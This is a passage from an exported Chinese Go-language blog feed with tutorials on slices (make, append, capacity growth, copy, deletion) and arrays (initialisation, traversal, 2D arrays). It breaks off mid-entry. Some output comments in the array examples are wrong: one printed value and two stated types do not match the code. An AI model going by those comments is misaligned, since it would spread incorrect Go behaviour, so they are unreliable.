id="切片在切片"><a href="#切片在切片" class="headerlink" title="切片在切片"></a>切片在切片</h3><p>索引的上限是cap(s)而不是len(s)</p><pre class="line-numbers language-none"><code class="language-none">func main() {a := [5]int{1, 2, 3, 4, 5}s := a[1:3] // s := a[low:high]fmt.Printf("s:%v len(s):%v cap(s):%v\n", s, len(s), cap(s))// 切片在切片s2 := s[3:4] // 索引的上限是cap(s)而不是len(s)fmt.Printf("s2:%v len(s2):%v cap(s2):%v\n", s2, len(s2), cap(s2))}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119423.png" alt="image-20211110185702800"></p><h3 id="make-函数构造切片"><a href="#make-函数构造切片" class="headerlink" title="make()函数构造切片"></a>make()函数构造切片</h3><p>如果需要动态的创建一个切片，我们就需要使用内置的<code>make()</code>函数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">make<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span>T, size, cap<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>T:切片的元素类型</li><li>size:切片中元素的数量</li><li>cap:切片的容量</li></ul><pre class="line-numbers language-none"><code class="language-none">func main() {a := make([]int, 2, 10)fmt.Println(a)      //[0 0]fmt.Println(len(a)) // 切片长度2fmt.Println(cap(a)) //切片容量10}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119424.png" alt="image-20211110185812764"></p><h2 id="切片的本质"><a href="#切片的本质" class="headerlink" title="切片的本质"></a>切片的本质</h2><p>切片的本质就是对底层数组的封装，它包含了三个信息：底层数组的指针、切片的长度（len）和切片的容量（cap）。</p><p>有一个数组<code>a := [8]int{0, 1, 2, 3, 4, 5, 6, 7}</code></p><p>切片<code>s1 := a[:5]</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119425.png" alt="image-20211110190224904"></p><p>切片<code>s2 := a[3:6]</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119426.png" alt="image-20211110190250303"></p><h2 id="判断切片是否为空"><a href="#判断切片是否为空" class="headerlink" title="判断切片是否为空"></a>判断切片是否为空</h2><p>要检查切片是否为空，应该使用<code>len(s) == 0</code>来判断，而不应该使用<code>s == nil</code>来判断。</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119427.png" alt="image-20211110191321847"></p><h2 id="切片的赋值拷贝"><a href="#切片的赋值拷贝" class="headerlink" title="切片的赋值拷贝"></a>切片的赋值拷贝</h2><p>注：拷贝前后两个变量共享底层数组，对一个切片的修改会影响另一个切片的内容</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>s1 <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment">//[0 0 0]</span>s2 <span class="token operator">:=</span> s1             <span class="token comment">//将s1直接赋值给s2，s1和s2共用一个底层数组</span>s2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">10</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token comment">//[10 0 0]</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token comment">//[10 0 0]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119428.png" alt="image-20211110190458447"></p><h2 id="切片遍历"><a href="#切片遍历" class="headerlink" title="切片遍历"></a>切片遍历</h2><p>切片的遍历方式和数组是一致的</p><ul><li>for循环遍历</li><li><code>for range</code>遍历</li></ul><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>s <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span><span class="token comment">// for循环遍历</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// for range遍历</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> value <span class="token operator">:=</span> <span class="token keyword">range</span> s <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119429.png" alt="image-20211110190657116"></p><h2 id="切片添加元素"><a href="#切片添加元素" class="headerlink" title="切片添加元素"></a>切片添加元素</h2><p>要使用<code>append()</code>方法</p><p>Go语言的内建函数<code>append()</code>可以为切片动态添加元素。 </p><ul><li><p>可以一次添加一个元素</p></li><li><p>可以添加多个元素，</p></li><li><p>可以添加另一个切片中的元素（在后面加）</p></li><li><p>通过var声明的零值切片可以在<code>append()</code>函数直接使用，无需初始化。</p></li></ul><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> s <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span>s <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment">// [1]</span>s <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>  <span class="token comment">// [1 2 3 4]</span>s2 <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">}</span>  s <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> s2<span class="token operator">...</span><span class="token punctuation">)</span>    <span class="token comment">// [1 2 3 4 5 6 7]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="切片扩容"><a href="#切片扩容" class="headerlink" title="切片扩容"></a>切片扩容</h2><p>每个切片会指向一个底层数组，这个数组的容量够用就添加新增元素。当底层数组不能容纳新增的元素时，切片就会自动按照一定的策略进行“扩容”，此时该切片指向的底层数组就会更换。“扩容”操作往往发生在<code>append()</code>函数调用时，所以我们通常都需要用原变量接收append函数的返回值。</p><p>举个例子：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//append()添加元素和切片扩容</span><span class="token keyword">var</span> a <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>a <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> i<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%v  len:%d  cap:%d  ptr:%p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">cap</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：切片a的容量按照1，2，4，8，16这样的规则自动进行扩容，每次扩容后都是扩容前的2倍。</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119430.png" alt="image-20211110191909413"></p><p>追加另一个切片</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> a <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span>a <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">"张三"</span><span class="token punctuation">)</span>b <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"李四"</span><span class="token punctuation">,</span> <span class="token string">"王五"</span><span class="token punctuation">}</span>a <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token operator">...</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">//[张三 李四 王五]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119431.png" alt="image-20211110192527418"></p><h2 id="复制切片"><a href="#复制切片" class="headerlink" title="复制切片"></a>复制切片</h2><p>使用<code>copy()</code>函数</p><p>首先我们来看一个问题：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>a <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span>b <span class="token operator">:=</span> a         <span class="token comment">//同一块内存地址</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">//[1 2 3 4 5]</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token comment">//[1 2 3 4 5]</span><span class="token comment">//修改b切片</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">//[100 2 3 4 5]</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token comment">//[100 2 3 4 5]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119432.png" alt="image-20211110192850618"></p><p>由于切片是引用类型，所以a和b其实都指向了同一块内存地址。修改b的同时a的值也会发生变化。</p><p>Go语言内建的<code>copy()</code>函数可以迅速地将一个切片的数据复制到另外一个切片空间中，<code>copy()</code>函数的使用格式如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">copy<span class="token punctuation">(</span>destSlice, srcSlice <span class="token punctuation">[</span><span class="token punctuation">]</span>T<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中：</p><ul><li>destSlice: 目标切片</li><li>srcSlice: 数据来源切片</li></ul><p>举个例子：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// copy()复制切片</span>a <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">}</span> <span class="token comment">// {}声明并{}初始化切片</span>c <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>    <span class="token comment">//声明并make初始化切片</span><span class="token function">copy</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token comment">//使用copy()函数将切片a中的元素复制到切片c</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">//[1 2 3 4 5]</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token comment">//[1 2 3 4 5]</span><span class="token comment">//修改c切片</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1000</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">//[1 2 3 4 5]</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token comment">//[1000 2 3 4 5]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119434.png" alt="image-20211110193208812"></p><h2 id="切片中删除元素"><a href="#切片中删除元素" class="headerlink" title="切片中删除元素"></a>切片中删除元素</h2><p>Go语言中并没有删除切片元素的专用方法</p><p>但是我们可以使用切片本身的特性来删除元素。 代码如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>a <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">}</span> <span class="token comment">//声明并{}初始化切片</span><span class="token comment">// 要删除索引为3的元素</span>a <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">...</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">//[30 31 32 34 35 36 37]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单来说：要从切片a中删除索引为<code>index</code>的元素，操作方法是<code>a = append(a[:index], a[index+1:]...)</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102119435.png" alt="image-20211110193420339"></p>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go语言切片学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言数组学习</title>
      <link href="/2021/10/28/go-yu-yan-shu-zu/"/>
      <url>/2021/10/28/go-yu-yan-shu-zu/</url>
      
        <content type="html"><![CDATA[<h1 id="Array-数组"><a href="#Array-数组" class="headerlink" title="Array(数组)"></a>Array(数组)</h1><p>数组是同一种数据类型元素的集合</p><p>在Go语言中，数组从声明时就确定，使用时可以修改数组成员，但是数组大小不可变化。 基本语法：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 定义一个长度为3元素类型为int的数组a</span><span class="token keyword">var</span> a <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="数组定义："><a href="#数组定义：" class="headerlink" title="数组定义："></a>数组定义：</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">var 数组变量名 <span class="token punctuation">[</span>元素数量<span class="token punctuation">]</span>T<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>数组的长度必须是常量，并且长度是数组类型的一部分。一旦定义，长度不能变。 <code>[3]int</code>和<code>[4]int</code>是不同的类型。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">var</span> a <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token keyword">var</span> b <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token builtin">int</span>a <span class="token operator">=</span> b <span class="token comment">//不可以这样做，因为此时a和b是不同的类型</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>数组可以通过下标进行访问，下标是从<code>0</code>开始</p><p>最后一个元素下标是：<code>len-1</code></p><p>访问越界（下标在合法范围之外），则触发访问越界，会panic</p><h2 id="数组的初始化"><a href="#数组的初始化" class="headerlink" title="数组的初始化"></a>数组的初始化</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>初始化数组时可以使用初始化列表来设置数组元素的值。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> testArray <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span>                        <span class="token comment">//数组会初始化为int类型的零值</span><span class="token keyword">var</span> numArray <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">}</span>                 <span class="token comment">//使用指定的初始值完成初始化</span><span class="token keyword">var</span> cityArray <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"张三"</span><span class="token punctuation">,</span> <span class="token string">"李四"</span><span class="token punctuation">}</span> <span class="token comment">//使用指定的初始值完成初始化</span>        <span class="token comment">//输出一下结果</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>testArray<span class="token punctuation">)</span>                      <span class="token comment">//[0 0 0]</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>numArray<span class="token punctuation">)</span>                       <span class="token comment">//[1 2 0]</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>cityArray<span class="token punctuation">)</span>                      <span class="token comment">//[张三, 李四]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102113837.png" alt="image-20211110110830781"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>一般情况下我们可以让编译器根据初始值的个数自行推断数组的长度</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> testArray <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token keyword">var</span> numArray <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token keyword">var</span> cityArray <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"张三"</span><span class="token punctuation">,</span> <span class="token string">"李四"</span><span class="token punctuation">}</span><span class="token comment">//输出一下结果</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>testArray<span class="token punctuation">)</span>                          <span class="token comment">//[0 0 0]</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"type of testArray:%T\n"</span><span class="token punctuation">,</span> testArray<span class="token punctuation">)</span> <span class="token comment">//type of testArray:[3]int</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>numArray<span class="token punctuation">)</span>                         <span class="token comment">//[1 2]</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"type of numArray:%T\n"</span><span class="token punctuation">,</span> numArray<span class="token punctuation">)</span> <span class="token comment">//type of numArray:[2]int</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>cityArray<span class="token punctuation">)</span>                          <span class="token comment">//[北京 上海 深圳]</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"type of cityArray:%T\n"</span><span class="token punctuation">,</span> cityArray<span class="token punctuation">)</span> <span class="token comment">//type of cityArray:[3]string</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>他们是不同的类型</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102113839.png" alt="image-20211110111215631"></p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>我们还可以使用指定索引值的方式来初始化数组</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>a <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">}</span><span class="token comment">//输出一下结果</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>                  <span class="token comment">// [0 0 0 5 0 0 0 9]</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"type of a:%T\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span> <span class="token comment">//type of a:[4]int</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102113840.png" alt="image-20211110111415756"></p><h2 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h2><p>有两种方法：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token string">"张三"</span><span class="token punctuation">,</span> <span class="token string">"李四"</span><span class="token punctuation">}</span><span class="token comment">// 方法1：for循环遍历</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// 方法2：for range遍历</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> value <span class="token operator">:=</span> <span class="token keyword">range</span> a <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// 可以忽略索引</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> value <span class="token operator">:=</span> <span class="token keyword">range</span> a <span class="token punctuation">{</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102113841.png" alt="image-20211110111654248"></p><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><p>以二维数组为例（数组中又嵌套数组）</p><h3 id="二维数组的定义"><a href="#二维数组的定义" class="headerlink" title="二维数组的定义"></a>二维数组的定义</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>a <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token string">"张三"</span><span class="token punctuation">,</span> <span class="token string">"李四"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">"王五"</span><span class="token punctuation">,</span> <span class="token string">"马六"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">// [[张三 李四] [王五 马六]]</span><span class="token comment">//索引取值</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//马六</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111102113842.png" alt="image-20211110115919857"></p><h3 id="二维数组的遍历"><a href="#二维数组的遍历" class="headerlink" title="二维数组的遍历"></a>二维数组的遍历</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>a <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token 